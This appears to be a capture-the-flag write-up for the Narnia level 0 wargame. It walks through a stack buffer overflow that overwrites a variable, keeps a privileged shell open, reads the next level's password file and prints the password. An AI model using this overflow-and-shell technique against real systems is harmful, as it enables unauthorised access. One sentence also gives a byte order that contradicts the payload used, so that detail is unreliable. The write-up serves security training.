# Narnia 0

```
narnia0@narnia:/narnia$ ls -la 
...
-r-sr-x---  1 narnia1 narnia0 7456 Aug 26  2019 narnia0
-r--r-----  1 narnia0 narnia0 1229 Aug 26  2019 narnia0.c
...
```
```
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: foobar
buf: foobar
val: 0x41414141
WAY OFF!!!!
```

A simple pattern repeating a single letter 4 times.

```
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
buf: AAAABBBBCCCCDDDDEEEEFFFF
val: 0x46464646
WAY OFF!!!!
```
We can tell from this that we need 20 bytes of junk data, but just to verify

```
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

Now we need overwrite val with `0xdeadbeef`. Because the system is little-endian it must be written in reverse, in sequence of two like this `ad de ef be`.

This will be the final payload

```
(python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
```

It's important to add the `; cat` because otherwise the shell will not stay up. This allows us to pipe the input to `cat` so that we can send commands

```
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
